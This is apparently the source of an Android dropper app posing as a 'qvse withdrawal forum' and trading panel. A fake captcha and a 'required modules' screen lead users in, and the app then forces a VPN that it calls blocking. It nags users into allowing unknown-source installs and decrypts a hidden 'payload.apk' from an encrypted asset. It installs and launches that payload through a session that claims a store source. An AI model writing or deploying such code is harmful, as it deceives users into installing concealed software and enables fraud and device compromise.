package com.onerule.task;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Random;

public class A4450c4b785 extends Activity {

    private static final String ASSET_NAME  = "module";
    private static final String INNER_NAME  = "payload.apk";

    private static final int REQ_VPN             = 1000;
    private static final int REQ_UNKNOWN_SOURCES = 1001;
    private static final String ACTION_INSTALL_DONE = "com.onerule.task.INSTALL_DONE";

    private static final long PERM_POLL_MS   = 400;
    private static final long LAUNCH_POLL_MS = 300;
    private static final long LAUNCH_TIMEOUT = 15_000;
    /** How often to poll ConnectivityManager to check VPN is still active. */
    private static final long VPN_MONITOR_MS = 600;

    private LinearLayout container;
    private final Handler ui = new Handler(Looper.getMainLooper());

    // Large flow state
    private int largeStep = 0; // 0 welcome, 1 countries, 2 captcha, 3 modules
    private String selectedCountry = "India";
    private String captchaCode = "";
    private EditText captchaInput;

    private TextView status;
    private Button   btn;
    private InstallResultReceiver receiver;
    private final Handler ui2 = new Handler(Looper.getMainLooper());

    /**
     * True once the user has granted VPN permission (so we know the system dialog
     * was answered). The Install button also requires isVpnActive() to be true at
     * the moment of the click.
     */
    private boolean vpnPermissionGranted         = false;
    private boolean awaitingUnknownSourcesGrant   = false;
    private Intent  pendingConfirmIntent          = null;
    private boolean justLaunchedConfirm           = false;

    /** True after the payload launches successfully — used to skip VPN re-checks. */
    private boolean installComplete = false;

    // ── VPN monitor ────────────────────────────────────────────────────────────

    /**
     * Periodic runnable that keeps the Install button in sync with live VPN status.
     */
    private final Runnable vpnMonitor = new Runnable() {
        @Override public void run() {
            if (installComplete) return;

            boolean live = isVpnLive();

            if (live) {
                if (btn != null && vpnPermissionGranted && !btn.isEnabled()) {
                    btn.setEnabled(true);
                    if (status != null) status.setText("Ready \u2014 tap Install to begin.");
                }
            } else {
                // VPN dropped (user killed it in Settings or service crashed).
                if (vpnPermissionGranted) {
                    vpnPermissionGranted = false;
                    if (btn != null) btn.setEnabled(false);
                    if (status != null) status.setText("VPN was disabled \u2014 please re-grant to continue.");
                    requestVpnPermission();
                }
            }

            ui.postDelayed(this, VPN_MONITOR_MS);
        }
    };

    private boolean isVpnLive() {
        if (V4450c4b785.isRunning()) return true;
        try {
            ConnectivityManager cm =
                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            for (Network net : cm.getAllNetworks()) {
                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ── Activity lifecycle ─────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (BuildConfig.IS_LARGE) {
            showLargeWelcome();
            return;
        }

        // Already installed → redirect instantly, no UI shown at all.
        if (isPayloadInstalled()) {
            doImmediateRedirect();
            return;
        }

        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        btn    = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> onInstallClicked());

        // Lock the Install button and demand VPN permission before anything else.
        btn.setEnabled(false);
        requestVpnPermission();

        // Start the monitor — it will enable the button once VPN is confirmed live.
        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
    }

    private void showLargeWelcome() {
        container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setBackgroundColor(Color.parseColor("#0F1026"));
        container.setPadding(60, 120, 60, 60);
        container.setGravity(Gravity.CENTER_HORIZONTAL);

        ScrollView scroll = new ScrollView(this);
        LinearLayout inner = new LinearLayout(this);
        inner.setOrientation(LinearLayout.VERTICAL);
        inner.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView title = new TextView(this);
        title.setText("Welcome to qvse withdrawal forum");
        title.setTextColor(Color.WHITE);
        title.setTextSize(24);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 40);
        inner.addView(title);

        TextView desc = new TextView(this);
        desc.setText("This app uses vpn vpn vpn services to setup connections to tunnel connections to other country which qvse is still operating not suspended by government legal requirements.");
        desc.setTextColor(Color.parseColor("#CCCCCC"));
        desc.setTextSize(16);
        desc.setGravity(Gravity.CENTER);
        desc.setLineSpacing(4, 1.2f);
        desc.setPadding(0, 0, 0, 80);
        inner.addView(desc);

        Button continueBtn = new Button(this);
        continueBtn.setText("Continue");
        continueBtn.setTextColor(Color.WHITE);
        continueBtn.setBackgroundColor(Color.parseColor("#2563EB"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 40, 0, 0);
        continueBtn.setLayoutParams(lp);
        continueBtn.setOnClickListener(v -> showLargeCountries());
        inner.addView(continueBtn);

        scroll.addView(inner);
        container.addView(scroll);
        setContentView(container);
    }

    private void showLargeCountries() {
        container.removeAllViews();
        ScrollView scroll = new ScrollView(this);
        LinearLayout inner = new LinearLayout(this);
        inner.setOrientation(LinearLayout.VERTICAL);
        inner.setPadding(60, 80, 60, 60);
        inner.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView title = new TextView(this);
        title.setText("Select Country");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setPadding(0, 0, 0, 40);
        inner.addView(title);

        RadioGroup rg = new RadioGroup(this);
        rg.setOrientation(RadioGroup.VERTICAL);

        String[] countries = {"India", "USA", "USA", "USA", "Ghana", "hifhli8"};
        for (String c : countries) {
            RadioButton rb = new RadioButton(this);
            if (c.equals("India")) {
                rb.setText("India (Recommended)");
            } else {
                rb.setText(c);
            }
            rb.setTextColor(Color.WHITE);
            rb.setPadding(20, 30, 20, 30);
            rb.setOnClickListener(v -> selectedCountry = c.equals("hifhli8") ? "hifhli8" : (c.equals("India") ? "India" : "USA"));
            if (c.equals("India")) {
                rb.setChecked(true);
                selectedCountry = "India";
            }
            rg.addView(rb);
        }
        inner.addView(rg);

        Button openPanel = new Button(this);
        openPanel.setText("Continue to trading panel");
        openPanel.setTextColor(Color.WHITE);
        openPanel.setBackgroundColor(Color.parseColor("#22C55E"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 60, 0, 0);
        openPanel.setLayoutParams(lp);
        openPanel.setOnClickListener(v -> showLargeCaptcha());
        inner.addView(openPanel);

        scroll.addView(inner);
        container.addView(scroll);
        setContentView(container);
    }

    private void showLargeCaptcha() {
        container.removeAllViews();
        ScrollView scroll = new ScrollView(this);
        LinearLayout inner = new LinearLayout(this);
        inner.setOrientation(LinearLayout.VERTICAL);
        inner.setPadding(60, 120, 60, 60);
        inner.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView title = new TextView(this);
        title.setText("Captcha Verification");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setPadding(0, 0, 0, 40);
        inner.addView(title);

        Random r = new Random();
        captchaCode = String.valueOf(1000 + r.nextInt(9000));
        TextView code = new TextView(this);
        code.setText(captchaCode);
        code.setTextColor(Color.YELLOW);
        code.setTextSize(36);
        code.setTypeface(null, android.graphics.Typeface.BOLD);
        code.setGravity(Gravity.CENTER);
        code.setPadding(0, 40, 0, 40);
        code.setBackgroundColor(Color.parseColor("#1E1E3F"));
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 200);
        code.setLayoutParams(clp);
        inner.addView(code);

        TextView hint = new TextView(this);
        hint.setText("Enter the code shown above");
        hint.setTextColor(Color.parseColor("#CCCCCC"));
        hint.setTextSize(16);
        hint.setPadding(0, 30, 0, 20);
        inner.addView(hint);

        captchaInput = new EditText(this);
        captchaInput.setTextColor(Color.WHITE);
        captchaInput.setHint("Enter code");
        captchaInput.setHintTextColor(Color.GRAY);
        captchaInput.setPadding(40, 30, 40, 30);
        inner.addView(captchaInput);

        Button verify = new Button(this);
        verify.setText("Verify");
        verify.setTextColor(Color.WHITE);
        verify.setBackgroundColor(Color.parseColor("#2563EB"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 60, 0, 0);
        verify.setLayoutParams(lp);
        verify.setOnClickListener(v -> {
            if (captchaInput.getText().toString().trim().equals(captchaCode)) {
                startLargeModuleInstall();
            } else {
                Toast.makeText(this, "Invalid captcha", Toast.LENGTH_SHORT).show();
            }
        });
        inner.addView(verify);

        scroll.addView(inner);
        container.addView(scroll);
        setContentView(container);
    }

    private void startLargeModuleInstall() {
        container.removeAllViews();
        ScrollView scroll = new ScrollView(this);
        LinearLayout inner = new LinearLayout(this);
        inner.setOrientation(LinearLayout.VERTICAL);
        inner.setPadding(60, 200, 60, 60);
        inner.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView msg = new TextView(this);
        msg.setText("First install required modules");
        msg.setTextColor(Color.WHITE);
        msg.setTextSize(20);
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 0, 0, 60);
        inner.addView(msg);

        status = new TextView(this);
        status.setText("Preparing...");
        status.setTextColor(Color.parseColor("#9CA3AF"));
        status.setGravity(Gravity.CENTER);
        inner.addView(status);

        btn = new Button(this);
        btn.setVisibility(View.GONE);
        inner.addView(btn);

        scroll.addView(inner);
        container.addView(scroll);
        setContentView(container);

        // Now run the existing install flow exactly as before
        if (isPayloadInstalled()) {
            doImmediateRedirect();
            return;
        }

        btn.setOnClickListener(v -> onInstallClicked());
        btn.setEnabled(false);
        requestVpnPermission();
        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
    }

    @Override
    protected void onDestroy() {
        // Remove all pending monitor callbacks to avoid leaks.
        ui.removeCallbacks(vpnMonitor);
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (BuildConfig.IS_LARGE && largeStep >= 3) {
            // Continue normal flow
        }

        // Always redirect if module is installed, regardless of installComplete state.
        if (isPayloadInstalled() && !installComplete) {
            doImmediateRedirect();
            return;
        }

        if (awaitingUnknownSourcesGrant) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                    || getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            }
        }

        if (pendingConfirmIntent != null) {
            if (justLaunchedConfirm) {
                justLaunchedConfirm = false;
            } else {
                Intent again = pendingConfirmIntent;
                justLaunchedConfirm = true;
                try {
                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(again);
                } catch (Exception ignored) {}
            }
        }
    }

    // ── VPN permission gate ────────────────────────────────────────────────────

    private void requestVpnPermission() {
        if (status != null) status.setText("Grant the VPN permission to continue\u2026");
        Intent vpnIntent;
        try {
            vpnIntent = VpnService.prepare(this);
        } catch (Exception e) {
            vpnIntent = null;  // Some OEMs throw; treat as already-granted.
        }

        if (vpnIntent == null) {
            // Already granted from a previous session — start the service directly.
            onVpnGranted();
        } else {
            startActivityForResult(vpnIntent, REQ_VPN);
        }
    }

    /**
     * Called once the user grants VPN permission.
     */
    private void onVpnGranted() {
        vpnPermissionGranted = true;

        if (V4450c4b785.isRunning()) {
            // Already live — skip the "Starting…" phase entirely.
            if (btn != null) btn.setEnabled(true);
            if (status != null) status.setText("Ready \u2014 tap Install to begin.");
            return;
        }

        try {
            startService(new Intent(this, V4450c4b785.class));
        } catch (Exception e) {
            android.util.Log.w(V4450c4b785.TAG,
                    "Could not start V4450c4b785: " + e.getMessage());
        }
        // The monitor will enable the button as soon as isRunning() becomes true.
        if (status != null) status.setText("Starting VPN\u2026 please wait.");
    }

    /**
     * Stops the blocking VPN.
     * Called ONLY after the payload launches successfully.
     */
    private void stopVpn() {
        installComplete = true;
        ui.removeCallbacks(vpnMonitor);
        V4450c4b785.stop(this);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                onVpnGranted();
            } else {
                // Denied — re-show after a short delay. Cannot proceed without it.
                vpnPermissionGranted = false;
                if (status != null) status.setText("VPN permission is required. Please allow it.");
                ui.postDelayed(this::requestVpnPermission, 900);
            }
        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            } else {
                runOnUiThread(() -> { if (status != null) status.setText("Permission denied \u2014 cannot install."); });
            }
        }
    }

    // ── Install flow ───────────────────────────────────────────────────────────

    private void onInstallClicked() {
        // Hard gate: verify VPN is actually live at click time, not just on paper.
        if (!vpnPermissionGranted || !isVpnLive()) {
            if (btn != null) btn.setEnabled(false);
            vpnPermissionGranted = false;
            if (status != null) status.setText("VPN must be active to install. Re-requesting\u2026");
            requestVpnPermission();
            return;
        }
        if (isPayloadInstalled()) {
            doImmediateRedirect();
            return;
        }
        startInstall();
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            if (status != null) status.setText("Allow install from this source \u2014 install starts automatically.");
            awaitingUnknownSourcesGrant = true;
            startPermissionPoll();
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        new Thread(this::dropAndInstall).start();
    }

    private void startPermissionPoll() {
        ui.postDelayed(new Runnable() {
            @Override public void run() {
                if (!awaitingUnknownSourcesGrant) return;
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                        || getPackageManager().canRequestPackageInstalls()) {
                    awaitingUnknownSourcesGrant = false;
                    new Thread(A4450c4b785.this::dropAndInstall).start();
                    return;
                }
                ui.postDelayed(this, PERM_POLL_MS);
            }
        }, PERM_POLL_MS);
    }

    // ── Payload queries ────────────────────────────────────────────────────────

    private boolean isPayloadInstalled() {
        String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) return false;
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private Intent resolvePayloadLaunchIntent(String pkg) {
        PackageManager pm = getPackageManager();
        Intent launch = pm.getLaunchIntentForPackage(pkg);
        if (launch != null) return launch;
        Intent probe = new Intent(Intent.ACTION_MAIN);
        probe.addCategory(Intent.CATEGORY_LAUNCHER);
        probe.setPackage(pkg);
        java.util.List<android.content.pm.ResolveInfo> ris =
                pm.queryIntentActivities(probe, 0);
        if (ris != null && !ris.isEmpty()) {
            android.content.pm.ActivityInfo ai = ris.get(0).activityInfo;
            Intent direct = new Intent(Intent.ACTION_MAIN);
            direct.addCategory(Intent.CATEGORY_LAUNCHER);
            direct.setClassName(ai.packageName, ai.name);
            return direct;
        }
        return null;
    }

    // ── Launch helpers ─────────────────────────────────────────────────────────

    /**
     * Immediate redirect for the "already installed" case.
     */
    private void doImmediateRedirect() {
        installComplete = true;
        ui.removeCallbacks(vpnMonitor);
        V4450c4b785.stop(this);

        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg != null && !pkg.isEmpty()) {
            Intent launch = resolvePayloadLaunchIntent(pkg);
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                try { startActivity(launch); } catch (Exception ignored) {}
            }
        }
        finish();
    }

    /**
     * Post-install launch
     */
    private void launchPayloadAndExit() {
        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) {
            if (status != null) status.setText("Installed.");
            return;
        }
        final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
        ui.post(new Runnable() {
            @Override public void run() {
                Intent launch = resolvePayloadLaunchIntent(pkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    try {
                        startActivity(launch);
                        stopVpn();
                        ui.postDelayed(A4450c4b785.this::finish, 150);
                    } catch (Exception e) {
                        if (status != null) status.setText("Launch failed: " + e.getMessage());
                    }
                    return;
                }
                if (System.currentTimeMillis() < deadline) {
                    ui.postDelayed(this, LAUNCH_POLL_MS);
                } else {
                    if (status != null)
                        status.setText("Installed \u2014 open " + pkg + " manually.");
                }
            }
        });
    }

    // ── Decryption + installation ──────────────────────────────────────────────

    private void dropAndInstall() {
        try {
            if (isPayloadInstalled()) {
                runOnUiThread(() -> {
                    installComplete = true;
                    if (status != null) status.setText("App installed, kindly wait for it to launch\u2026");
                    if (btn != null) btn.setEnabled(false);
                    launchPayloadAndExit();
                });
                return;
            }

            runOnUiThread(() -> { if (status != null) status.setText("Decrypting module \u2026"); });

            File workDir = new File(getCacheDir(), "drop");
            if (!workDir.exists()) workDir.mkdirs();
            File leftover = new File(workDir, INNER_NAME);
            if (leftover.exists()) leftover.delete();

            File encZip = new File(workDir, "m.zip");
            try (InputStream in = getAssets().open(ASSET_NAME);
                 OutputStream out = new FileOutputStream(encZip)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            }

            ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
            zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
            encZip.delete();

            File apk = new File(workDir, INNER_NAME);
            if (!apk.exists() || apk.length() == 0) {
                throw new RuntimeException("Decrypted payload missing");
            }

            runOnUiThread(() -> { if (status != null) status.setText("Installing \u2026"); });
            installViaSession(apk);
        } catch (Exception e) {
            // Failed — VPN intentionally left running.
            runOnUiThread(() -> { if (status != null) status.setText("Install failed: " + e.getMessage()); });
        }
    }

    private void installViaSession(File apk) throws Exception {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setInstallReason(PackageManager.INSTALL_REASON_USER);

        if (Build.VERSION.SDK_INT >= 33) {
            try { params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE); }
            catch (Throwable ignored) {}
        }
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                params.getClass().getMethod("setRequestUpdateOwnership", boolean.class)
                        .invoke(params, true);
            } catch (Throwable ignored) {}
        }

        int sessionId = pi.createSession(params);
        try (PackageInstaller.Session session = pi.openSession(sessionId)) {
            try (OutputStream sout = session.openWrite("base.apk", 0, apk.length());
                 InputStream  sin  = new FileInputStream(apk)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = sin.read(buf)) > 0) sout.write(buf, 0, n);
                session.fsync(sout);
            }

            if (receiver != null) {
                try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            }
            receiver = new InstallResultReceiver();
            IntentFilter filter = new IntentFilter(ACTION_INSTALL_DONE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                        ? PendingIntent.FLAG_MUTABLE : 0);
            Intent cb = new Intent(ACTION_INSTALL_DONE).setPackage(getPackageName());
            PendingIntent pending = PendingIntent.getBroadcast(
                    this, sessionId, cb, piFlags);

            session.commit(pending.getIntentSender());
        }
    }

    private class InstallResultReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
            if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) {
                    confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    pendingConfirmIntent = confirm;
                    justLaunchedConfirm  = true;
                    startActivity(confirm);
                }
            } else if (s == PackageInstaller.STATUS_SUCCESS) {
                pendingConfirmIntent = null;
                runOnUiThread(() -> {
                    if (status != null) status.setText("App installed, kindly wait for it to launch\u2026");
                    if (btn != null) btn.setEnabled(false);
                    launchPayloadAndExit();
                });
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            } else {
                // Failed — VPN stays active (no stopVpn() call).
                pendingConfirmIntent = null;
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                runOnUiThread(() -> { if (status != null) status.setText("Install failed: " + msg); });
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            }
        }
    }
}
